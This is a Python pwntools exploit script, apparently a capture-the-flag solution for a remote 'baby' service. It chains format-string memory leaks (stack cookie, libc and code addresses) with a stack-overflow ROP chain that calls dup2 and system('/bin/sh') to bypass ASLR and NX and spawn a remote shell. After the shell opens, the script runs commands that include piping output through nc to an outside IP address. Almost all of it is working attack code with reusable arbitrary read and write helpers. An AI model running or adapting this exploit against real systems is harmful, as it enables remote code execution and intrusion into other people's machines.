#!/usr/bin/env python
# -*- coding: utf-8 -*-
# pasteBin - Jordan Brown 2016
# exploit format string with ASLR and NX
# 
# General approach is to abstract the shit out of everything
# and make each function as robust as possible
# 
# once done, this removes the hassel of being a finikey bitch

import sys
from pwn import *

with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	"""
		send a line to the program
		but also save it to 'payload'
		so we can recreate later
	"""
	conn.sendline(line)
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)


def set_cur_val(a):
	"""
		~~~ IMPORTANT ~~
		the %n operator write the number of bytes written so far 
		%hhn writes one byte (0x00 -> 0xff)

		This function returns the minimal payload required
		to print out enough whitespace to get the number
		of characters printed to the desired value

		To do this it uses a global counter called 'current_val'
		which represents the number of bytes written so far
	"""
	global current_val

	# Work out how much whitespace we need to overflow
	# the least significant byte to 0x00
	gets_to_zero = 256 - current_val # add this to get to 0x00

	# then add the amount required to get to the desired value
	gets_to_destination = gets_to_zero + a 

	# since it's 1 byte it doesn't make sense to use more than 256 characters
	inc = gets_to_destination%256 # adding > 256 is the same as adding 0 so mod 256

	# update the number of bytes printed
	current_val = a
	# if we don't have to increment then just return an empty string
	if inc == 0: # %0c is the same as %1c so if it's 0 difference then just print nothing
		return "" 
	return "%1$" + str(inc) + "c" 

def payload_write_data_to_addr(data, addr):
	"""
		Writes 4 bytes of your choice to the address given
		This is the back bone of this exploit

		Finikey as fuck
	"""
	global current_val

	# remove '0x' and convert to little endian
	# 0xaabbccdd -> ddccbbaa 
	# 0x12345678 -> 87654321
	hexStr = hex(data)[2:][::-1] 


	# ddccbbaa -> [dd, cc, bb, aa]
	# 87654321 -> [78, 56, 34, 12]
	byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]

	# convert from hex strings to data
	bytes = [int(x,16) for x in byteList]

	# need to offset the payload by 1 byte
	# took me 3 fucking hours to work that out
	payload = "A" 

	# we are going to write to the 4 bytes of 
	# our address. E.G if we got data:0xa1b2c3d4 addr: 0xffb7aa00
	# we would write the following bytes to the addresses below:
	# 0xffb7aa00 : d4
	# 0xffb7aa01 : c3
	# 0xffb7aa02 : b2
	# 0xffb7aa03 : a1
	# 
	# 0xffb7aa00  == d4c3b2a1
	# (int) * 0xffb7aa00  == 0xa1b2c3d4
	# add our addresses to the start of the format string
	for a in range(len(bytes)):
		payload += p64(addr + a) 

	# this is the offset of the first address in our string
	# it also took a while to work out
	offset = 9 

	# set the number of bytes written to be the current length of
	# our payload
	current_val = len(payload)

	# this takes the a'th byte index of the address you want to 
	# write to, and writes the number of bytes printed there
	write_to_byte = lambda a: "%{0}$hhn".format(a + offset)

	# for each byte, set the least significant byte of the
	# value for the number of bytes written
	# and write that to the address
	for pos, byte in enumerate(bytes):
		payload += set_cur_val(byte) + write_to_byte(pos)

	# return the payload string to use
	return payload

def payload_read_addr(addr):
	"""
		Leak the value at address (addr)
		put it in a print statement in between ':::'
		to make finding it easier
	"""

	# necessary offset
	payload = ""

	# just writing the address
	payload += p64(addr)

	# this is the offset of the first address in our string
	offset = 9
	current_val = len(payload)

	payload += ":::%{0}$s:::".format(offset)

	return payload

def deref(addr):
	"""
		Dereference a pointer
	"""

	# get the value of the pointer you want to dereference
	payload = payload_read_addr(addr)
	send(conn, payload)

	# used to identify the value at the address
	conn.recvuntil(':::'),
	memoryString = conn.recvuntil(':::')[:-3] # grab the data
	conn.recv()
	buff = []
	for char in memoryString[::-1]:
		h = hex(ord(char))[2:]
		if len(h) == 1:
			h = '0' + h
		buff.append(h)
	return buff[-4:]


def stack_leak(offset):
	"""
		Leak an offset value from the stack
	"""
	payload = "%" + str(offset) + "$llx"
	send(conn, "AA" + payload + "BB")

	conn.recvuntil('AA'),
	memoryString = conn.recvuntil('BB')[:-2] 
	conn.recv()
	return memoryString



local = True
my_sock = 4

if len(sys.argv) == 2:
	local = False


off2ref = lambda off: off/8 + 4
# run the process
conn = {}
libc = {}
leak_off = {}
j_set = 0
code_leak = 0
if local:
	conn = remote("127.0.0.1", 1337)
	libc = elf.ELF("/lib/x86_64-linux-gnu/libc-2.24.so")
	leak_off =  list(libc.search(p64(0xd001200003eba)))[0] # local

	code_offset = off2ref(104)
else:
	conn = remote("baby.teaser.insomnihack.ch", 1337)
	libc = elf.ELF("libc.so")
	leak_off =  list(libc.search(p64(0xd001200003e92)))[0] #live
	j_set = 8
	code_offset = off2ref(400) + 9

welcome = conn.recvuntil('Your choice >')
print welcome,


send(conn, "2") # select format string
conn.recvuntil("Your format >")

def deref_offset(offset):
	payload = "%{ref}$llx".format(ref=offset)
	send(conn, payload)
	leak = int(conn.recvuntil("\n"), 16)
	conn.recvuntil("Your format >")
	return leak

# get the cookie
cookie = deref_offset(off2ref(1072))
sys_block_leak = deref_offset(off2ref(112) + j_set)


# todo: confirm this is the leak you get when using their lib
# ohhh I could use %s to check it ..

shift = libc.symbols['system'] - leak_off 
system = sys_block_leak + shift

print libc.symbols['dup2'] - libc.symbols['system']

dup2 = system + libc.symbols['dup2'] - libc.symbols['system']
puts = system + libc.symbols['puts'] - libc.symbols['system']
fflush = system + libc.symbols['fflush'] - libc.symbols['system']


binsh = deref_offset(1) + 7 # why not, should have big buffer of ';'s


print "the cookie is: " + hex(cookie)
print "system is at : " + hex(system)
print "/bin/sh is at : " + hex(binsh)


#    baby : 0x55bb57f81f09 --> 0x100000079626162 
#		0x55bb57f81c8b: pop rdi; ret
# From 0x55bb57f81f09 to 0x55bb57f81c8b: -638 bytes, -160 dwords (+2 bytes)

code_leak = deref_offset(code_offset)
shift = -638
pop_rdi = code_leak + shift
rop_n_pop_rsi = pop_rdi - 2
rop_n_nop = pop_rdi + 1
print "rop gadget rdi is at : " + hex(pop_rdi)
print "rop gadget rsi is at : " + hex(rop_n_pop_rsi)


# these are all wrong probably...
k_rdi = 0x561ee1243c8b
k_binsh = 0x7fffdae9b748
# subtract the known one then add the live leak to get to the right spot


# payload = stack_leak(off2ref(112))
# payload = "%{offset}$s.".format(offset=off2ref(112) + j_set)
# payload += "%{offset}$llx.".format(offset=off2ref(112))
# payload += "%{offset}$llx.".format(offset=off2ref(112)+1)
# payload += "%{offset}$llx.".format(offset=off2ref(112)+2)
# payload += "%{offset}$llx.".format(offset=off2ref(112)+3)
# payload += "%{offset}$llx.".format(offset=off2ref(112)+4) 
# payload = "%{offset}$llx.".format(offset=off2ref(112)+5) 
# payload += "%{offset}$llx.".format(offset=off2ref(112)+6) 
# payload += "%{offset}$llx.".format(offset=off2ref(112)+7) 
# payload += "%{offset}$llx.".format(offset=off2ref(112)+8) 
# payload = "%{offset}$s.".format(offset=off2ref(112)+9) # stack pointer # 0x7ffe526fbdbfef80
# payload += "%{offset}$s.".format(offset=off2ref(112)+10) 
# payload += "%{offset}$llx.".format(offset=off2ref(112)+11) 
# send(conn, "A"*100)

# 0528| 0x7ffe415201a8 --> 0x7f9c653fdc12 (<_IO_new_fclose+306>:	mov    eax,ebp)

jingle = 0 + 0#j_set
# payload = "%{offset}$llx.".format(offset=jingle) 
# payload += "%{offset}$s.".format(offset=jingle+1) 
# payload += "%{offset}$llx.".format(offset=jingle+2) 
# payload += "%{offset}$llx.".format(offset=jingle+3) 
# payload += "%{offset}$llx.".format(offset=jingle+4) 
# payload += "%{offset}$llx.".format(offset=jingle+5) 
# payload += "%{offset}$llx.".format(offset=jingle+6) 
# payload += "%{offset}$llx.".format(offset=jingle+7) 
# payload += "%{offset}$llx.".format(offset=jingle+8) 
# payload += "%{offset}$llx.".format(offset=jingle+9) 
# 192 gives elf


payload = ";"*1000 +  "/bin/sh;%s" # add one for the newline
send(conn, payload)

# print "AA" + conn.recvuntil("\n")
# conn.interactive()
# exit(1)

payload = ""

def grab_it(x, off):
	try:
		return p64(system + int(list(libc.search(x))[0]) + off - libc.symbols['system'])
	except:
		# failed to find the memory thing you wanted :(
		return "/bin/sh;" # may as well litter this everywhere

payload += "/bin/sh\n"						  
payload += "/bin/sh\n"							  
payload += p64(0x1 )								
payload += p64(0x561ee1a8e40f - k_rdi + pop_rdi ) 
payload += p64(0x561ee1243f09 - k_rdi + pop_rdi ) 
payload += grab_it("_dl_fixup", 212)
payload += p64(0x1 )								
payload += p64(0x0 )								
payload += p64(0x561ee1243f09 - k_rdi + pop_rdi ) 
payload += grab_it(p64(0xd001200003eba), 0)
payload += p64(0x7fffdae9b890 - k_binsh + binsh)	
payload += grab_it("_dl_runtime_resolve_avx", 179)
payload += p64(0xffffffff00000000 )				  
payload += p64(0xffffffffffffffff )				  
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "me/baby:"							  
payload += "/bin/sh\n"							  
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += p64(0xffff )							  
payload +=  "/bin/sh\n"							  
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += p64(0xff0000000000 )					  
payload += p64(0xff00000000000000 )				  
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += p64(0xffffffffffffff )				  
payload += p64(0xffffffff00ffffff )				  
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += p64(0x561ee1a906a0 - k_rdi + pop_rdi ) 
payload += p64(0x7fffdae9b888 - k_binsh + binsh)	
payload += p64(0x561e00000001 )					  
payload += p64(0x582a594 )						  
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += grab_it("flush_cleanup",0)
payload += p64(0x561ee1a906a0 - k_rdi + pop_rdi ) 
payload += "/bin/sh\n"								
payload += grab_it(p64(0), 0)
payload += p64(0x400 )							  
payload += p64(0x1 )								
payload += p64(0x561ee1a8e40f - k_rdi + pop_rdi ) 
payload += grab_it("IO_new_fclose", 306)
payload += p64(0x7fffdae9b900 - k_binsh + binsh)	
payload += grab_it("give_pwd_free", 48)
payload += p64(0x7fffdae9b900 - k_binsh + binsh)	
payload += grab_it("internal_endpwent", 129)
payload += p64(0x7fffdae9b900 - k_binsh + binsh)	
payload += grab_it("_nss_compat_getpwnam_r", 167)
payload += p64(0x10 )							  
payload += grab_it(p64(0), 0)
payload += p64(0x561ee1a8e010 - k_rdi + pop_rdi ) # should point to baby
payload += grab_it(p64(0), 0)
payload += p64(0x7fffdae9b8f0 - k_binsh + binsh) # should point to above pointer	
payload += p64(0x400e1a8e670 )					  
payload += p64(0xb5b )							  
payload += grab_it("nss_load_library+", 238)
payload += p64(0x100010000 )	 					
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += p64(0x7fffdae9ba30 - k_binsh + binsh)	
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += grab_it("0x558b639b6010", 0) # should also point to baby, weird..
payload += p64(0x400 )							  
payload += p64(0x1 )								
payload += grab_it(p64(0), 0)
payload += grab_it("__getpwnam_r", 546)
payload += p64(0x2 )								
payload += p64(0x561ee1243f09 - k_rdi + pop_rdi ) 
payload += p64(0x561ee1a8e010 - k_rdi + pop_rdi ) 
payload += p64(0x7fffdae9ba30 - k_binsh + binsh)	
payload += p64(0x7fffdae9ba38 - k_binsh + binsh)	
payload += "/bin/sh\n"								
payload += "/bin/sh\n"								
payload += p64(0x7fffdae9ba88 - k_binsh + binsh)	
payload += grab_it("_nss_compat_getpwnam_r", 0)
payload += p64(0x561ee1a8f720 - k_rdi + pop_rdi ) 
payload += p64(0x7fffdae9bc20 - k_binsh + binsh)	
payload += p64(0x400 )							  
payload += p64(0x561ee1243f09 - k_rdi + pop_rdi ) 
payload += p64(0x561ee12432e7 - k_rdi + pop_rdi ) 
payload += p64(0x7fffdae9ba88 - k_binsh + binsh)	
payload += p64(0x8e )							  
payload += p64(0x561ee1243e30 - k_rdi + pop_rdi ) 
payload += p64(0x561ee1243255 - k_rdi + pop_rdi ) 
payload += p64(0x8e )							  
payload += p64(0x2 )								
payload += p64(0x7fffdae9bad0 - k_binsh + binsh)	
payload += p64(0x4e124335c )	 					
payload += p64(0x2 )								
payload += p64(cookie)		# stack cookie		  
payload += p64(0x7fffdae9bae0 - k_binsh + binsh)	

payload +=  p64(rop_n_nop)#p64(pop_rdi)											
payload +=  p64(rop_n_nop)#p64(4)				 
payload +=  p64(rop_n_pop_rsi) 										
payload +=  p64(0) # the file descriptor of stdin 							 
payload +=  p64(cookie) #ahaha this happens to also be a cookie	
payload +=  p64(dup2) 	 	

payload +=  p64(rop_n_pop_rsi) 											
payload +=  p64(1)  # stdout						
payload +=  "ABCDEFGH" # junk 										
payload +=  p64(dup2) # dup2(my_sock, stdout)								 
payload +=  p64(pop_rdi)  # junnk 											
payload +=  p64(binsh) 																							
payload +=  p64(system)  # this has the sock	

# payload += p64(0x561ee12439c3 - k_rdi + pop_rdi )    # 1080| 0x7fffdae9bab8 --> 0x561ee12439c3 (<handle+111>:	jmp    0x561ee12439f3 <handle+159>)
# payload += p64(0x561ee1242ff0 - k_rdi + pop_rdi )    # 1088| 0x7fffdae9bac0 --> 0x561ee1242ff0 (<_start>:	xor    ebp,ebp)
# payload += p64(0x4e1243f09 )	 					  # 1096| 0x7fffdae9bac8 --> 0x4e1243f09 
# payload += p64(0xa31 )							      # 1104| 0x7fffdae9bad0 --> 0xa31 ('1\n')
# payload += p64(cookie)		# stack cookie		      # 1112| 0x7fffdae9bad8 --> 0x801d72a2bf8bd100 
# payload += p64(0x7fffdae9bb40 - k_binsh + binsh)	  # 1120| 0x7fffdae9bae0 --> 0x7fffdae9bb40 --> 0x561ee1243c30 (<__libc_csu_init>:	push   r15)
# payload += p64(0x561ee1243bf0 - k_rdi + pop_rdi )    # 1128| 0x7fffdae9bae8 --> 0x561ee1243bf0 (<main+497>:	mov    DWORD PTR [rbp-0x30],eax)
# payload += p64(0x7fffdae9bc28 - k_binsh + binsh)	  # 1136| 0x7fffdae9baf0 --> 0x7fffdae9bc28 --> 0x7fffdae9c349 --> 0x4700796261622f2e ('./baby')
# payload += p64(0x1fe85adf5 )	 					  # 1144| 0x7fffdae9baf8 --> 0x1fe85adf5 
# payload += p64(0x1 )								  # 1152| 0x7fffdae9bb00 --> 0x1 
# payload += p64(0x1e1243c75 )	 					  # 1160| 0x7fffdae9bb08 --> 0x1e1243c75 
# payload += p64(0x300000000 )	 					  # 1168| 0x7fffdae9bb10 --> 0x300000000 
# payload += p64(0x4 )								  # 1176| 0x7fffdae9bb18 --> 0x4 
# payload += p64(0x39050002 )						  # 1184| 0x7fffdae9bb20 --> 0x39050002 
# payload += p64(0x0 )								  # 1192| 0x7fffdae9bb28 --> 0x0 


# payload +=  p64(pop_rdi)  # junnk 											
# payload +=  p64(binsh) 																							
# payload +=  p64(puts)  # this has the sock	

							 
# payload +=  p64(pop_rdi)  # junnk 											
# payload +=  p64(4) 																							
# payload +=  p64(fflush)  # this has the sock	

							 
# payload +=  p64(pop_rdi)  # junnk 											
# payload +=  p64(binsh) 																							
# payload +=  p64(system)  # this has the sock	


# send(conn, "\n") # end the format string
send(conn, "") # end the format string
send(conn, "1") # stack overflow pls
# conn.recvuntil("How much bytes you want to send ?")

# it wants 10 digits
length = str(len(payload) - 1)
while len(length) != 9:
	length += "\x00"
print length
# leave room for the \n so only 9

send(conn, length) # this is how much
send(conn, ''.join(payload))
send(conn, "ls -la")
send(conn, "echo 'hi' | nc 13.55.116.151 1234")
send(conn, "echo '************************************asdf' ")
# print conn.recv()
# print conn.recv()
# print conn.recv()
conn.interactive()
